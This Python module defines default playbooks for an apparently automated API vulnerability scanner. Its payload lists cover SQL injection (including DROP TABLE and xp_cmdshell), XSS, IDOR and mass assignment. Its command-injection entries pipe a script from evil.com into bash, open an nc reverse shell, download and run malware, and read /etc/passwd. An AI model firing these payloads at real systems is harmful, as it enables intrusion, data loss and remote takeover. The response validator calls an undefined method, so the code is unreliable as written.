"""
Playbooks for API Security Testing
Defines methodologies for testing different vulnerability types
"""

from typing import Dict, List, Any, Optional
import json
import os
import asyncio
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'storage'))
from db import storage_db

class PlaybookManager:
    """Manages security testing playbooks for different vulnerability types"""

    def __init__(self):
        self.playbooks = {}
        self.initialized = False
        # Note: Playbooks are loaded lazily when first accessed

    async def initialize_playbooks(self):
        """Initialize playbooks from database or create defaults"""
        # Try to load from database first
        self.playbooks = await storage_db.get_all_playbooks()

        # If no playbooks in DB, create and store defaults
        if not self.playbooks:
            print("No playbooks found in database, initializing defaults...")
            default_playbooks = self.get_default_playbooks()
            for vuln_type, playbook in default_playbooks.items():
                success = await storage_db.store_playbook(vuln_type, playbook)
                if success:
                    self.playbooks[vuln_type] = playbook
                    print(f"Stored playbook for {vuln_type}")
                else:
                    print(f"Failed to store playbook for {vuln_type}")

    def get_default_playbooks(self) -> Dict[str, Dict[str, Any]]:
        """Get default playbooks for common vulnerabilities"""
        return {
            "SQL Injection": {
                "description": "Test for SQL injection vulnerabilities in API parameters",
                "methodology": {
                    "reconnaissance": [
                        "Identify input parameters that interact with databases",
                        "Check for common SQL keywords in parameter names",
                        "Analyze API responses for database error patterns"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Basic SQL Injection",
                            "description": "Test basic SQL injection patterns",
                            "payloads": [
                                "' OR '1'='1",
                                "' OR '1'='1' --",
                                "1' OR '1'='1",
                                "' UNION SELECT NULL --",
                                "'; DROP TABLE users; --"
                            ],
                            "target_parameters": ["query", "search", "filter", "id", "username", "email"],
                            "http_methods": ["GET", "POST", "PUT"],
                            "success_indicators": ["SQL syntax error", "database error", "ORA-", "MySQL", "PostgreSQL"]
                        },
                        {
                            "phase": "Blind SQL Injection",
                            "description": "Test time-based and boolean-based blind SQL injection",
                            "payloads": [
                                "' AND SLEEP(5) --",
                                "' AND 1=1 --",
                                "' AND 1=2 --",
                                "1' AND SLEEP(5) --"
                            ],
                            "target_parameters": ["id", "user_id", "product_id"],
                            "http_methods": ["GET"],
                            "success_indicators": ["delayed response", "different response times"]
                        },
                        {
                            "phase": "Advanced SQL Injection",
                            "description": "Test advanced SQL injection techniques",
                            "payloads": [
                                "'; EXEC xp_cmdshell('net user') --",
                                "' UNION SELECT database() --",
                                "' UNION SELECT table_name FROM information_schema.tables --"
                            ],
                            "target_parameters": ["query", "search"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["command executed", "database name revealed", "table names"]
                        }
                    ],
                    "validation_rules": [
                        "Check for SQL error messages in responses",
                        "Monitor response times for time-based attacks",
                        "Verify data leakage in successful injections",
                        "Test parameter encoding and sanitization"
                    ]
                },
                "severity": "high",
                "cvss_base_score": 8.5,
                "enabled": True
            },

            "XSS (Cross-Site Scripting)": {
                "description": "Test for Cross-Site Scripting vulnerabilities",
                "methodology": {
                    "reconnaissance": [
                        "Identify parameters that reflect user input in responses",
                        "Check for HTML/JS contexts in API responses",
                        "Analyze Content-Type headers for HTML responses"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Reflected XSS",
                            "description": "Test for reflected XSS in API responses",
                            "payloads": [
                                "<script>alert(1)</script>",
                                "<img src=x onerror=alert(1)>",
                                "<svg onload=alert(1)>",
                                "javascript:alert(1)",
                                "<iframe src=javascript:alert(1)></iframe>"
                            ],
                            "target_parameters": ["text", "message", "comment", "name", "description", "query"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["script executed", "alert popup", "HTML injection"]
                        },
                        {
                            "phase": "Stored XSS",
                            "description": "Test for stored XSS in persistent data",
                            "payloads": [
                                "<script>alert('stored')</script>",
                                "<img src=x onerror=alert('stored')>",
                                "'><script>alert('stored')</script>"
                            ],
                            "target_parameters": ["comment", "message", "bio", "description"],
                            "http_methods": ["POST", "PUT"],
                            "success_indicators": ["persistent script execution", "stored payload"]
                        },
                        {
                            "phase": "DOM-based XSS",
                            "description": "Test for DOM-based XSS vulnerabilities",
                            "payloads": [
                                "#<script>alert('dom')</script>",
                                "?param=<script>alert('dom')</script>",
                                "<script>eval(location.hash.slice(1))</script>"
                            ],
                            "target_parameters": ["fragment", "hash", "location"],
                            "http_methods": ["GET"],
                            "success_indicators": ["DOM manipulation", "client-side execution"]
                        }
                    ],
                    "validation_rules": [
                        "Check if payloads are reflected in responses",
                        "Verify script execution in browser context",
                        "Test input sanitization and encoding",
                        "Monitor for Content Security Policy bypasses"
                    ]
                },
                "severity": "high",
                "cvss_base_score": 7.5,
                "enabled": True
            },

            "IDOR (Insecure Direct Object References)": {
                "description": "Test for Insecure Direct Object Reference vulnerabilities",
                "methodology": {
                    "reconnaissance": [
                        "Identify endpoints with object IDs in URL paths",
                        "Check for user-specific data access patterns",
                        "Analyze authorization requirements"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Basic IDOR",
                            "description": "Test basic ID manipulation",
                            "payloads": [
                                "1", "2", "999", "0", "-1",
                                "1000", "999999", "2147483647"
                            ],
                            "target_parameters": ["id", "user_id", "account_id", "order_id"],
                            "http_methods": ["GET", "PUT", "DELETE"],
                            "success_indicators": ["access to other user's data", "unauthorized access"]
                        },
                        {
                            "phase": "Parameter-based IDOR",
                            "description": "Test IDOR in query/form parameters",
                            "payloads": [
                                "user_id=1", "user_id=2", "account_id=999",
                                "id=0", "id=-1", "id=999999"
                            ],
                            "target_parameters": ["user_id", "account_id", "resource_id"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["data leakage", "horizontal privilege escalation"]
                        },
                        {
                            "phase": "Sequential ID Testing",
                            "description": "Test sequential ID enumeration",
                            "payloads": ["sequential_increment"],
                            "target_parameters": ["id", "resource_id"],
                            "http_methods": ["GET"],
                            "success_indicators": ["information disclosure", "resource enumeration"]
                        }
                    ],
                    "validation_rules": [
                        "Verify if user can access other users' data",
                        "Check for proper authorization controls",
                        "Test ID validation and bounds checking",
                        "Monitor for information disclosure"
                    ]
                },
                "severity": "medium",
                "cvss_base_score": 6.5,
                "enabled": True
            },

            "Broken Access Control": {
                "description": "Test for broken access control mechanisms",
                "methodology": {
                    "reconnaissance": [
                        "Map user roles and permissions",
                        "Identify admin-only endpoints",
                        "Check for role-based access patterns"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Horizontal Privilege Escalation",
                            "description": "Test access to other users' resources",
                            "payloads": ["modify_user_id", "session_hijacking"],
                            "target_parameters": ["user_id", "account_id"],
                            "http_methods": ["GET", "PUT", "DELETE"],
                            "success_indicators": ["unauthorized access", "privilege escalation"]
                        },
                        {
                            "phase": "Vertical Privilege Escalation",
                            "description": "Test access to higher privilege functions",
                            "payloads": ["admin_endpoints", "role_manipulation"],
                            "target_parameters": ["role", "permissions"],
                            "http_methods": ["GET", "POST", "PUT"],
                            "success_indicators": ["admin access", "role elevation"]
                        },
                        {
                            "phase": "Mass Assignment",
                            "description": "Test for mass assignment vulnerabilities",
                            "payloads": [
                                '{"role": "admin", "permissions": ["read", "write", "delete"]}',
                                '{"is_admin": true, "superuser": true}'
                            ],
                            "target_parameters": ["user_data", "profile"],
                            "http_methods": ["PUT", "PATCH"],
                            "success_indicators": ["unexpected privilege gain", "attribute injection"]
                        }
                    ],
                    "validation_rules": [
                        "Verify proper authorization for all endpoints",
                        "Test role-based access controls",
                        "Check for insecure direct object references",
                        "Validate input parameter restrictions"
                    ]
                },
                "severity": "high",
                "cvss_base_score": 8.0,
                "enabled": True
            },

            "Command Injection": {
                "description": "Test for command injection vulnerabilities",
                "methodology": {
                    "reconnaissance": [
                        "Identify endpoints that execute system commands",
                        "Check for shell metacharacters in parameters",
                        "Analyze command execution patterns"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Basic Command Injection",
                            "description": "Test basic command injection patterns",
                            "payloads": [
                                "; ls -la",
                                "| cat /etc/passwd",
                                "`whoami`",
                                "$(whoami)",
                                "; ping -c 1 127.0.0.1"
                            ],
                            "target_parameters": ["cmd", "command", "exec", "run"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["command output", "file listing", "system information"]
                        },
                        {
                            "phase": "Blind Command Injection",
                            "description": "Test blind command injection",
                            "payloads": [
                                "; sleep 5",
                                "| sleep 5",
                                "`sleep 5`",
                                "$(sleep 5)"
                            ],
                            "target_parameters": ["cmd", "exec"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["delayed response", "time-based detection"]
                        },
                        {
                            "phase": "Advanced Command Injection",
                            "description": "Test advanced command injection techniques",
                            "payloads": [
                                "; curl http://evil.com/shell.sh | bash",
                                "| nc -e /bin/sh evil.com 4444",
                                "`wget http://evil.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware`"
                            ],
                            "target_parameters": ["command", "script"],
                            "http_methods": ["POST"],
                            "success_indicators": ["reverse shell", "malware execution", "data exfiltration"]
                        }
                    ],
                    "validation_rules": [
                        "Check for command execution in responses",
                        "Monitor response times for blind injection",
                        "Verify input sanitization and validation",
                        "Test for dangerous command chaining"
                    ]
                },
                "severity": "critical",
                "cvss_base_score": 9.5,
                "enabled": True
            },

            "Rate Limiting Bypass": {
                "description": "Test for rate limiting bypass vulnerabilities",
                "methodology": {
                    "reconnaissance": [
                        "Identify rate-limited endpoints",
                        "Check rate limit headers",
                        "Analyze timing patterns"
                    ],
                    "testing_phases": [
                        {
                            "phase": "Header Manipulation",
                            "description": "Test rate limiting bypass via headers",
                            "payloads": ["X-Forwarded-For variations", "User-Agent changes"],
                            "target_parameters": ["headers"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["bypassed rate limit", "excessive requests allowed"]
                        },
                        {
                            "phase": "IP Spoofing",
                            "description": "Test IP-based rate limiting bypass",
                            "payloads": ["127.0.0.1", "10.0.0.1", "::1"],
                            "target_parameters": ["X-Forwarded-For", "X-Real-IP"],
                            "http_methods": ["GET", "POST"],
                            "success_indicators": ["rate limit evasion", "IP spoofing success"]
                        }
                    ],
                    "validation_rules": [
                        "Monitor request frequency limits",
                        "Check rate limit enforcement",
                        "Test header-based bypass techniques",
                        "Verify distributed rate limiting"
                    ]
                },
                "severity": "medium",
                "cvss_base_score": 5.5,
                "enabled": True
            }
        }
        return self.playbooks

    async def ensure_initialized(self):
        """Ensure playbooks are loaded from database"""
        if not self.initialized:
            await self.initialize_playbooks()
            self.initialized = True

    def get_available_vulnerabilities(self) -> List[str]:
        """Get list of available vulnerability types from playbooks"""
        # This method is synchronous, so we need to handle async initialization differently
        if not self.initialized:
            # For synchronous access, try to get from cache or return empty
            return list(self.playbooks.keys()) if self.playbooks else []
        return [vuln for vuln, config in self.playbooks.items() if config.get("enabled", True)]

    async def get_playbook_async(self, vulnerability_type: str) -> Optional[Dict[str, Any]]:
        """Get playbook for a specific vulnerability type"""
        await self.ensure_initialized()
        return self.playbooks.get(vulnerability_type)

    def get_playbook(self, vulnerability_type: str) -> Optional[Dict[str, Any]]:
        """Get playbook for a specific vulnerability type (synchronous)"""
        if not self.initialized:
            return None  # Return None if not initialized
        return self.playbooks.get(vulnerability_type)

    async def get_methodology_for_vulnerability_async(self, vulnerability_type: str) -> Optional[Dict[str, Any]]:
        """Get testing methodology for a vulnerability type"""
        playbook = await self.get_playbook_async(vulnerability_type)
        return playbook.get("methodology") if playbook else None

    def get_methodology_for_vulnerability(self, vulnerability_type: str) -> Optional[Dict[str, Any]]:
        """Get testing methodology for a vulnerability type (synchronous)"""
        playbook = self.get_playbook(vulnerability_type)
        return playbook.get("methodology") if playbook else None

    async def get_payloads_for_phase_async(self, vulnerability_type: str, phase: str) -> List[str]:
        """Get payloads for a specific testing phase"""
        methodology = await self.get_methodology_for_vulnerability_async(vulnerability_type)
        if not methodology:
            return []

        for testing_phase in methodology.get("testing_phases", []):
            if testing_phase["phase"] == phase:
                return testing_phase.get("payloads", [])

        return []

    async def get_target_parameters_async(self, vulnerability_type: str, phase: str) -> List[str]:
        """Get target parameters for a specific testing phase"""
        methodology = await self.get_methodology_for_vulnerability_async(vulnerability_type)
        if not methodology:
            return []

        for testing_phase in methodology.get("testing_phases", []):
            if testing_phase["phase"] == phase:
                return testing_phase.get("target_parameters", [])

        return []

    async def get_success_indicators_async(self, vulnerability_type: str, phase: str) -> List[str]:
        """Get success indicators for a specific testing phase"""
        methodology = await self.get_methodology_for_vulnerability_async(vulnerability_type)
        if not methodology:
            return []

        for testing_phase in methodology.get("testing_phases", []):
            if testing_phase["phase"] == phase:
                return testing_phase.get("success_indicators", [])

        return []

    async def generate_smart_payloads(self, vulnerability_type: str, endpoint_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate context-aware payloads based on endpoint information"""
        methodology = await self.get_methodology_for_vulnerability_async(vulnerability_type)
        if not methodology:
            return []

        smart_payloads = []
        endpoint_path = endpoint_info.get("path", "")
        endpoint_method = endpoint_info.get("method", "GET")
        parameters = endpoint_info.get("parameters", [])

        for phase in methodology.get("testing_phases", []):
            phase_name = phase["phase"]
            payloads = phase.get("payloads", [])
            target_params = phase.get("target_parameters", [])
            http_methods = phase.get("http_methods", [])

            # Filter by HTTP method
            if http_methods and endpoint_method not in http_methods:
                continue

            # Generate payloads for matching parameters
            for param in parameters:
                # Handle both string parameters and dict parameters
                if isinstance(param, str):
                    param_name = param
                    param_type = "string"
                elif isinstance(param, dict):
                    param_name = param.get("name", "")
                    param_type = param.get("type", "string")
                else:
                    continue

                # Check if parameter is relevant for this vulnerability
                if any(target in param_name.lower() for target in target_params):
                    for payload in payloads:
                        # Adapt payload based on parameter type
                        adapted_payload = self._adapt_payload_to_parameter(payload, param_type, param_name)

                        smart_payloads.append({
                            "vulnerability_type": vulnerability_type,
                            "phase": phase_name,
                            "parameter": param_name,
                            "payload": adapted_payload,
                            "http_method": endpoint_method,
                            "endpoint": endpoint_path,
                            "expected_indicators": phase.get("success_indicators", [])
                        })

        return smart_payloads

    def _adapt_payload_to_parameter(self, payload: str, param_type: str, param_name: str) -> str:
        """Adapt payload based on parameter type and name"""
        if param_type == "integer" or param_type == "number":
            # For numeric parameters, try to inject into string contexts
            return f"1{payload}"
        elif param_type == "boolean":
            # For boolean parameters, might need different approach
            return payload
        else:
            # String parameters - use payload as-is
            return payload

    async def validate_response_for_vulnerability(self, response: Dict[str, Any], vulnerability_type: str, phase: str) -> Dict[str, Any]:
        """Validate API response for vulnerability indicators"""
        methodology = await self.get_methodology_for_vulnerability_async(vulnerability_type)
        if not methodology:
            return {"is_vulnerable": False, "confidence": 0, "indicators": []}

        indicators_found = []
        confidence = 0

        # Get success indicators for this phase
        success_indicators = self.get_success_indicators(vulnerability_type, phase)

        response_body = str(response.get("body", ""))
        response_headers = response.get("headers", {})
        response_status = response.get("status_code", 200)
        response_time = response.get("response_time", 0)

        # Check for success indicators in response
        for indicator in success_indicators:
            if indicator.lower() in response_body.lower():
                indicators_found.append(indicator)
                confidence += 0.3

            # Check headers
            for header_value in response_headers.values():
                if indicator.lower() in str(header_value).lower():
                    indicators_found.append(f"Header: {indicator}")
                    confidence += 0.2

        # Time-based detection for blind injections
        if "sleep" in str(success_indicators) and response_time > 4:
            indicators_found.append("Delayed response (possible blind injection)")
            confidence += 0.4

        # Status code analysis
        if response_status in [500, 502, 503]:
            indicators_found.append(f"Error status code: {response_status}")
            confidence += 0.2

        return {
            "is_vulnerable": confidence > 0.5,
            "confidence": min(confidence, 1.0),
            "indicators": indicators_found,
            "severity": self.playbooks.get(vulnerability_type, {}).get("severity", "low")
        }


# Global playbook manager instance
playbook_manager = PlaybookManager()